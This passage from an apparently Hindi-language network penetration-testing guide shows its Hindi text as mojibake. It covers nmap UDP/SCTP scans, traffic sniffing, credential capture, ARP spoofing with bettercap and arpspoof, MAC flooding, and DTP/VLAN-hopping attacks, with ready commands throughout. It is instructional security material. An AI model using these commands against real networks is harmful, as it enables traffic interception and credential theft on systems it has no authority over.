**Nmap** "-sV" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреЛрдиреЛрдВ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ **рдорд┐рд▓рд╛рдПрдЧрд╛** (UDP рд╕реНрдХреИрди рдмрд╣реБрдд рдзреАрдореЗ рд╣реЛрддреЗ рд╣реИрдВ), рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ UDP рд╕реНрдХреИрди, TCP рд╕реНрдХреИрди рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдзреАрдореЗ рд╣реЛрддреЗ рд╣реИрдВ:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP рд╕реНрдХреИрди

SCTP, TCP рдФрд░ UDP рдХреЗ рд╕рд╛рде рдмреИрдарддрд╛ рд╣реИред **IP** рдкрд░ **рдЯреЗрд▓реАрдлреЛрдиреА** рдбреЗрдЯрд╛ рдХреЗ **рдкрд░рд┐рд╡рд╣рди** рдХреЛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд░рд╛рджрд╛, рдкреНрд░реЛрдЯреЛрдХреЙрд▓ SS7 (Signaling System 7) рдХреА рдХрдИ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ рджреЛрд╣рд░рд╛рддрд╛ рд╣реИ, рдФрд░ SIGTRAN рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдиреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдмрдбрд╝реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░рд┐рд╡рд╛рд░ рдХрд╛ рдЖрдзрд╛рд░ рд╣реИред SCTP рдХрд╛ рд╕рдорд░реНрдерди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдЬреИрд╕реЗ IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS, рдФрд░ VxWorks рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

SCTP рдХреЗ рд▓рд┐рдП nmap рджреНрд╡рд╛рд░рд╛ рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реНрдХреИрди рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╣реИрдВ: _-sY_ рдФрд░ _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS рдФрд░ IPS рдЪрдХрдорд╛ рджреЗрдирд╛

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **рдФрд░ nmap рд╡рд┐рдХрд▓реНрдк**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### рдЖрдВрддрд░рд┐рдХ IP рдкрддреЗ рдкреНрд░рдХрдЯ рдХрд░рдирд╛

рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд░рд╛рдЙрдЯрд░, рдлрд╝рд╛рдпрд░рд╡реЙрд▓, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЙрдкрдХрд░рдг рдХрднреА-рдХрднреА **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рджреЗрддреЗ рд╣реИрдВ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдмреНрд╕ рдХреЛ **рдЧреИрд░-рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╕реНрд░реЛрдд рдкрддреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЖрдк _tcpdump_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдкреИрдХреЗрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЬреЛ **рдирд┐рдЬреА рдкрддреЛрдВ** рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреЗ рд╣реИрдВ рдкрд░реАрдХреНрд╖рдг рдХреЗ рджреМрд░рд╛рдиред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, Kali Linux рдореЗрдВ _eth2_ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ **рд╕рдВрдмреЛрдзрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЗрдВрдЯрд░рдиреЗрдЯ** рд╕реЗ (рдпрджрд┐ рдЖрдк **рдкреАрдЫреЗ** рд╣реИрдВ рдПрдХ **NAT** рдХрд╛ рдпрд╛ рдПрдХ **Firewall** рдХрд╛ рддреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯреНрд╕ рд╢рд╛рдпрдж **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ)ред
```bash
tcpdump тАУnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## рд╕реНрдирд┐рдлрд┐рдВрдЧ

рд╕реНрдирд┐рдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдк IP рд░реЗрдВрдЬ, рд╕рдмрдиреЗрдЯ рд╕рд╛рдЗрдЬ, MAC рдкрддреЗ, рдФрд░ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреА рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдкрдХрдбрд╝реЗ рдЧрдП рдлреНрд░реЗрдореНрд╕ рдФрд░ рдкреИрдХреЗрдЯреНрд╕ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдХреЗ рд╕реАрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рд╕реНрд╡рд┐рдЪрд┐рдВрдЧ рдлреИрдмреНрд░рд┐рдХ рддрдирд╛рд╡ рдореЗрдВ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдкреИрд╕рд┐рд╡ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдПрдХ рд╕реНрд╡рд┐рдЪреНрдб рдИрдерд░рдиреЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреЗрд╡рд▓ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдлреНрд░реЗрдореНрд╕ рдФрд░ рдЖрдкрдХреЗ MAC рдкрддреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдпрдд рд╕рд╛рдордЧреНрд░реА рд╣реА рджреЗрдЦ рдкрд╛рдПрдВрдЧреЗред

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
рдЖрдк рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ Wireshark рдХреЗ GUI рдХреЗ рд╕рд╛рде SSH рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рджреВрд░рд╕реНрде рдорд╢реАрди рд╕реЗ рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рднреА рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

рд╕реНрдкрд╖реНрдЯ рд╣реИред

### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛

рдЖрдк [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) рдЬреИрд╕реЗ рдЯреВрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ pcap рдпрд╛ рд▓рд╛рдЗрд╡ рдЗрдВрдЯрд░рдлреЗрд╕ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкрд╛рд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## LAN рд╣рдорд▓реЗ

### ARP рд╕реНрдкреВрдлрд┐рдВрдЧ

ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рдореЗрдВ рдЧреНрд░реИрдЪреНрдпреБрдЗрдЯрд╕ ARPResponses рднреЗрдЬрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдпрд╣ рд╕рдВрдХреЗрдд рдорд┐рд▓рддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдорд╢реАрди рдХрд╛ IP рд╣рдорд╛рд░реЗ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ MAC рдХреЗ рд╕рд╛рде рд╣реИред рдлрд┐рд░, рдкреАрдбрд╝рд┐рдд ARP рдЯреЗрдмрд▓ рдХреЛ рдмрджрд▓ рджреЗрдЧрд╛ рдФрд░ рдЬрдм рднреА рд╡рд╣ рд╕реНрдкреВрдл рдХрд┐рдП рдЧрдП IP рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдЧрд╛, рд╣рдорд╛рд░реА рдорд╢реАрди рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░реЗрдЧрд╛ред

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM рдУрд╡рд░рдлреНрд▓реЛ

рд╕реНрд╡рд┐рдЪ рдХреЗ CAM рдЯреЗрдмрд▓ рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реНрд░реЛрдд MAC рдкрддреЗ рдХреЗ рд╕рд╛рде рдмрд╣реБрдд рд╕рд╛рд░реЗ рдкреИрдХреЗрдЯреНрд╕ рднреЗрдЬрдХрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░реЗрдВред рдЬрдм CAM рдЯреЗрдмрд▓ рднрд░ рдЬрд╛рддреА рд╣реИ рддреЛ рд╕реНрд╡рд┐рдЪ рд╣рдм рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рдиреЗ рд▓рдЧрддрд╛ рд╣реИ (рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рдирд╛)ред
```bash
macof -i <interface>
```
рдЖрдзреБрдирд┐рдХ рд╕реНрд╡рд┐рдЪреЗрд╕ рдореЗрдВ рдпрд╣ рдХрдордЬреЛрд░реА рдареАрдХ рдХрд░ рджреА рдЧрдИ рд╣реИред

### 802.1Q VLAN / DTP рд╣рдорд▓реЗ

#### рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ

**DTP (рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдПрдХ рд▓рд┐рдВрдХ рдкрд░рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЯреНрд░рдВрдХрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред DTP рдХреЗ рд╕рд╛рде, рд╕реНрд╡рд┐рдЪ рддрдп рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдореЛрдб (Trunk) рдореЗрдВ рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдФрд░ рдХреМрди рд╕рд╛ рдирд╣реАрдВред **DTP** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЦрд░рд╛рдм рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рдЬрд╛рдЗрди** рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред **рдЯреНрд░рдВрдХреНрд╕ рдХреЛ рд╕рдЦреНрддреА рд╕реЗ** рд╡рд╣рд╛рдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд╣рд╛рдВ рдЙрдирдХреА рдЬрд░реВрд░рдд рд╣реИ, рдФрд░ рдЗрд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╕рднреА рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯреНрд╕ рдбрд╛рдпрдирд╛рдорд┐рдХ рдСрдЯреЛ рдореЛрдб рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред** рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯ рдкрдбрд╝реЛрд╕реА рд╕реНрд╡рд┐рдЪ рд╕реЗ рдЯреНрд░рдВрдХ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдореЛрдб рдореЗрдВ рд╣реИред **Pentester рдХреЛ рднреМрддрд┐рдХ рд░реВрдк рд╕реЗ рд╕реНрд╡рд┐рдЪ рд╕реЗ рдЬреБрдбрд╝рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ DTP Desirable рдлреНрд░реЗрдо рднреЗрдЬрдирд╛ рд╣реЛрдЧрд╛**, рдЬрд┐рд╕рд╕реЗ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ STP рдлреНрд░реЗрдо рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ VLANs рдХрд╛ рдЕрдиреБрдХреНрд░рдордг рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдХрд░ VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдХрдИ рд╕реНрд╡рд┐рдЪреЗрд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (DTP) рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд┐рд╕реЗ рдПрдХ рд╡рд┐рд░реЛрдзреА рд╕реНрд╡рд┐рдЪ рдХреА рдирдХрд▓ рдХрд░рдиреЗ рдФрд░ рд╕рднреА VLANs рдореЗрдВ рдЯреНрд░реИрдлрд┐рдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЯреВрд▓ [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд░рд┐рдкреЛрд░реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЕрдЧрд░ рд╕реНрд╡рд┐рдЪ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдореЛрдб, рдЯреНрд░рдВрдХ, рдбрд╛рдпрдирд╛рдорд┐рдХ, рдСрдЯреЛ рдпрд╛ рдПрдХреНрд╕реЗрд╕ рдореЛрдб рдореЗрдВ рд╣реИ** (рдпрд╣реА рдПрдХрдорд╛рддреНрд░ рд╣реИ рдЬреЛ VLAN рд╣реЙрдкрд┐рдВрдЧ рд╕реЗ рдмрдЪреЗрдЧрд╛)ред рдЯреВрд▓ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрдЧрд╛ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдХрдордЬреЛрд░ рд╣реИ рдпрд╛ рдирд╣реАрдВред

рдпрджрд┐ рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдХрдордЬреЛрд░ рд╣реИ, рддреЛ рдЖрдк _**Yersinia**_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ "**рдЯреНрд░рдВрдХрд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ**" рдкреНрд░реЛрдЯреЛрдХреЙрд▓ "**DTP**" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдиреНрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдк рд╕рднреА VLANs рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯреНрд╕ рджреЗрдЦ рдкрд╛рдПрдВрдЧреЗред
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
```markdown
![](<../../.gitbook/assets/image (646) (1).png>)

VLANs рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП DTP Desirable рдлреНрд░реЗрдо рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py) рдХреЗ рд╕рд╛рдеред **рдХрд┐рд╕реА рднреА рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдмрд╛рдзрд┐рдд рди рдХрд░реЗрдВред** рдпрд╣ рд╣рд░ рддреАрди рд╕реЗрдХрдВрдб рдореЗрдВ DTP Desirable рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред **рд╕реНрд╡рд┐рдЪ рдкрд░ рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдмрдирд╛рдП рдЧрдП рдЯреНрд░рдВрдХ рдЪреИрдирд▓ рдХреЗрд╡рд▓ рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдХреЗ рд▓рд┐рдП рдЬреАрд╡рд┐рдд рд░рд╣рддреЗ рд╣реИрдВред рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдХреЗ рдмрд╛рдж, рдЯреНрд░рдВрдХ рдмрдВрдж рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред**
```
```
sudo python3 DTPHijacking.py --interface eth0
```
#### рд╡рд┐рд╢рд┐рд╖реНрдЯ VLANs рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдирд╛

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк VLAN IDs рдФрд░ IPs рдорд╛рдиреЛрдВ рдХреЛ рдЬрд╛рди рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ VLAN рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдпрджрд┐ DHCP рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ, рддреЛ рд╕реНрдерд┐рд░ IP рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП _ifconfig_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд VLAN рд╣реЙрдкрд░

**рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдиреЗ рдФрд░ рдЕрдиреНрдп VLANs рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЪрд░реНрдЪрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣рдорд▓рд╛ рдЗрд╕ рдЯреВрд▓ рджреНрд╡рд╛рд░рд╛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### рдбрдмрд▓ рдЯреИрдЧрд┐рдВрдЧ

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдкреАрдбрд╝рд┐рдд рд╣реЛрд╕реНрдЯ рдХреЗ MAC, IP рдФрд░ VLAN ID рдХрд╛ рдореВрд▓реНрдп рдкрддрд╛ рд╣реЛ**, рддреЛ рд╡рд╣ рдЕрдкрдиреЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд VLAN рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЗ VLAN рдХреЗ рд╕рд╛рде рдПрдХ рдлреНрд░реЗрдо рдХреЛ **рдбрдмрд▓ рдЯреИрдЧ** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ **рдкреАрдбрд╝рд┐рдд рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд╛рде рд╡рд╛рдкрд╕ рдЬреБрдбрд╝рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдЧрд╛**, рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП **рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╡рд┐рдХрд▓реНрдк UDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рд╣реИ** рдЙрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдЬреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдХреНрд░рд┐рдпрд╛рдПрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ SNMP).

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рдпрд╣ рд╣реИ рдХрд┐ рд╡рд╣ **TCP рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рд▓реЙрдиреНрдЪ рдХрд░реЗ рдЬрд┐рд╕рдореЗрдВ рдПрдХ IP рдХреЛ рд╕реНрдкреВрдл рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ рдЬрд┐рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕реЗ рдкреАрдбрд╝рд┐рдд рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдБрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рд╢рд╛рдпрдж рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ). рдлрд┐рд░, рд╣рдорд▓рд╛рд╡рд░ рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реИ рдпрджрд┐ рдЙрд╕реЗ рдкреАрдбрд╝рд┐рдд рд╕реЗ рдХреБрдЫ рдкреИрдХреЗрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (635) (1).png>)

